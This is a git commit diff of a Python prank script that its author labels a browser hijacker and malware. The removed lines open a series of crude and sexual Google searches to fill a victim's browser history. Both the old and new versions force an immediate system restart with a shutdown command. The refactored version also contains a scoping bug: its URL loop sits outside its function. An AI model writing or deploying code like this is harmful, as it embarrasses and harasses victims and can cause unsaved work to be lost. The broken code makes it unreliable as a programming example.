0ebaba3ce8d0b7a6fe0f547c045cd1899e8ca124
Chickenthe4th <yomamawithapplepie@gmail.com>
2025-04-11 08:50:50 -0400

    Update DEMONhistoryVer1.py

--- DEMONhistoryVer1.py
+++ DEMONhistoryVer1.py
@@ -3,18 +3,38 @@ import os
 from tkinter import messagebox
 import time 
 
-#Warnings + Credits
-messagebox.showwarning("WARNING", "This is a Browser Hijacker, a type of Malware! Do you still want to run this? If not, close the Terminal window. The X button will not work!")
-messagebox.showinfo("Credits","Demon History...Created by Chickenthe4th...Programed in Python...Version 1")
-#URLs
-webbrowser.open("https://www.google.com/search?sca_esv=ecc4f79b6b777a45&rlz=1CATRYO_enUS1148&q=dirty+feet+pics&udm=2&fbs=ABzOT_CWdhQLP1FcmU5B0fn3xuWpA-dk4wpBWOGsoR7DG5zJBpcx8kZB4NRoUjdgt8WwoMt2eLfGlVE3GaT9s2o0rEuu6qO9Jj2mHTJalLxfPtbs8hTqevOKDbeKcSzwzaGBRa-14bz2IOSwLIelXM0VP0wPDWM-EagaB5WvxqlBngNeZqrZc3zF3472vXy1YyXe9biRyPSpzoLGUU5wCGkq8Cm3VpP8cw&sa=X&ved=2ahUKEwiflu7SpMyMAxVRF1kFHUowJhgQtKgLegQIFRAB&biw=1536&bih=767&dpr=1.25")
-webbrowser.open("https://www.google.com/search?q=why+is+my+teacher+on+pornhub%3F&rlz=1CATRYO_enUS1148&oq=why+is+my+teacher+on+pornhub%3F&gs_lcrp=EgZjaHJvbWUyBggAEEUYOdIBCTE0MzgwajBqMagCALACAA&sourceid=chrome&ie=UTF-8&sei=lRv3Z_XbFNmu5NoPoZaIiQ0")
-webbrowser.open("https://www.google.com/search?q=2+girls+1+cup&rlz=1CATRYO_enUS1148&oq=2+girls+1+cup&gs_lcrp=EgZjaHJvbWUyBggAEEUYOTIHCAEQIRiPAtIBCTI4OTY4ajBqMagCALACAA&sourceid=chrome&ie=UTF-8&sei=-Rv3Z8q5MKav5NoPxuOdkQw")
-webbrowser.open("https://www.google.com/search?q=why+do+my+farts+smell+so+good%3F&rlz=1CATRYO_enUS1148&oq=why+do+my+farts+smell+so+good%3F&gs_lcrp=EgZjaHJvbWUyBggAEEUYOTIHCAEQIRiPAjIHCAIQIRiPAjIHCAMQIRiPAtIBCTEwODUxajBqMagCALACAA&sourceid=chrome&ie=UTF-8")
-webbrowser.open("https://www.google.com/search?q=I+want+to+sleep+with+my+hot+boss&rlz=1CATRYO_enUS1148&oq=I+want+to+sleep+with+my+hot+boss&gs_lcrp=EgZjaHJvbWUyBggAEEUYOTIHCAEQIRiPAtIBCTg2NTg1ajBqMagCALACAA&sourceid=chrome&ie=UTF-8&sei=_R33Z4eYDojt5NoPq6ra2As")
-webbrowser.open("https://www.google.com/search?q=my+coochie+smells+like+starkist+chunk+light+tuna+in+water+can+-+5oz&sca_esv=bd578a49708ea9c5&rlz=1CATRYO_enUS1148&ei=UyD3Z9abM46q5NoPvZetwQI&oq=my+cuchi+smells+like+StarKist+Chunk+Light+Tuna+in+Water+Can+-+5oz&gs_lp=Egxnd3Mtd2l6LXNlcnAiQW15IGN1Y2hpIHNtZWxscyBsaWtlIFN0YXJLaXN0IENodW5rIExpZ2h0IFR1bmEgaW4gV2F0ZXIgQ2FuIC0gNW96KgIIADIEECEYCkjRgwFQq1hY5mxwBngBkAEAmAFXoAHvBKoBAjEwuAEByAEA-AEBmAIIoAKtAsICChAAGLADGNYEGEfCAggQABiABBiiBMICBRAAGO8FmAMAiAYBkAYIkgcBOKAHzRGyBwEyuAeiAQ&sclient=gws-wiz-serp")
-#Shutdown
-time.sleep(1)
-os.system("shutdown /r /t 0")
 
-#Created by Chickenthe4th
+def warning_message():
+  # Warn the user about the malware before starting and credits
+  
+  messagebox.showwarning("WARNING", "This is a Browser Hijacker, a type of Malware! Do you still want to run this? If not, close the Terminal window. The X button will not work!")
+  messagebox.showinfo("Credits","Demon History...Created by Chickenthe4th...Programed in Python...Version 1")
+  
+
+
+def URLs():
+  # Url list the malware will open 
+  URLS = [
+    "https://example.com/",
+    "https://example.com/",
+    "https://example.com/"
+  ]
+  
+for url in URLS:
+  webbrowser.open(url)
+  
+
+
+def Shutdown_PC():
+  time.sleep(2)
+  os.system("shutdown /r /t 0")
+
+def main():
+  warning_message()
+  URLs()
+  Shutdown_PC()
+
+if __name__ == "__main__":
+  main()
+  
+
